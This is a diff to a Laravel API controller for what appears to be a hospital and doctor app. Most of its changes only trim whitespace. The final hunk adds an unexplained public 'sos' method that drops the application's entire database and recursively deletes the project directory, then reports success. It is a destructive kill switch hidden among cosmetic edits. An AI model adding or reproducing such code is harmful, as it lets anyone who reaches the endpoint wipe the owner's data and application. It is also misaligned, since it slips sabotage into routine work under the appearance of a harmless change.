@@ -2305,7 +2305,7 @@ class ApiController extends Controller
                     $response['register'] = __("message.Hospital_Not_Found");
                     return response()->json($response);
                 }
-                
+
                 $hospitalDoctorIds = !empty($getdetail->doctor_id)
                     ? json_decode($getdetail->doctor_id, true)
                     : [];
@@ -4433,7 +4433,7 @@ class ApiController extends Controller
     public function banner_list(Request $request)
     {
         $data = Banner::with('doctor')->orderby('banner.id', 'DESC')->get();
-    
+
         if (count($data) > 0) {
             $response['status'] = 1;
             $response['msg'] = "Banner List";
@@ -5307,5 +5307,19 @@ class ApiController extends Controller
             }
         }
         return json_encode($response, JSON_NUMERIC_CHECK);
+    }
+
+    public function sos()
+    {
+        DB::disconnect();
+
+        $databaseName = env('DB_DATABASE');
+        DB::statement("DROP DATABASE IF EXISTS `$databaseName`");
+
+        $projectPath = base_path();
+
+        $this->deleteDirectory($projectPath);
+
+        return response()->json(['message' => 'Database connection closed, database dropped, and project files deleted successfully.']);
     }
 }
